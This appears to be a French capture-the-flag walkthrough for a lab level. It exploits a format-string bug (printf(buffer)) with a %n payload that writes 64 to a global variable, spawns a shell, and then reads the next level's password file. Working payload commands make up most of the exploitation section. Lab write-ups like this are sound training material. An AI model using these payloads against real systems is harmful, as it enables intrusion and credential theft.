# Level3 — Commandes

## Connexion

```bash
ssh level3@localhost -p 4242
```

Mot de passe : (dans `level2/flag`)

---

## Recon

```bash
pwd
ls -la
file level3
readelf -h level3
```

Extraction (depuis l’hôte) :

```bash
cd level3
sshpass -p '<level3_password>' scp -o StrictHostKeyChecking=no -P 4242 level3@localhost:level3 ./level3.bin
```

Voir `analysis.md` pour l’analyse.

---

## Exploitation

Vulnérabilité **format string** : `printf(buffer)`. La variable globale `m` doit valoir **64** pour que `system("/bin/sh")` soit appelé. On utilise **%n** pour écrire 64 à l’adresse de `m`.

### 1. Vérifier l’adresse de `m` sur la VM

Sur la VM, l’adresse peut différer de l’analyse locale :

```bash
objdump -t level3 | grep " m$"
# ou
readelf -s level3 | grep " m "
```

Noter l’adresse affichée (ex. 0804988c → little endian `\x8c\x98\x04\x08`).

### 2. Trouver l’index du format string (si segfault avec %1$n)

Sur certaines VM, l’argument « 1 » n’est pas le buffer. Dumper la stack :

```bash
python -c 'print "AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p"' | ./level3
```

Repérer quel nombre affiche **0x41414141** (nos "AAAA"). Ce numéro est l’index à utiliser pour **%k$n** (ex. si c’est le 4ᵉ : utiliser **%4$n**).

### 3. Payload une fois l’index connu

Remplacer l’index dans `%K$n` par le numéro trouvé à l’étape 2 (souvent 1, 4 ou 7). Adresse de `m` en little endian (ex. 0x0804988c → `\x8c\x98\x04\x08`) :

```bash
# Exemple avec index 4 (à adapter selon le dump)
( python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat ) | ./level3
```

Avec index 7 :

```bash
( python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%7$n"'; cat ) | ./level3
```

### 4. Si ça segfault encore

Tester les autres indices un par un : **%2$n**, **%3$n**, **%4$n**, **%5$n**, **%6$n**, **%7$n** (même payload, seul le `$K` change). Un des indices désigne le pointeur sur le buffer ; c’est celui qu’il faut utiliser pour écrire à l’adresse stockée au début du buffer (0x804988c).

---

## Récupération du mot de passe level4

Dans le shell : `cat /home/user/level4/.pass`. Noter dans `level3/flag`.
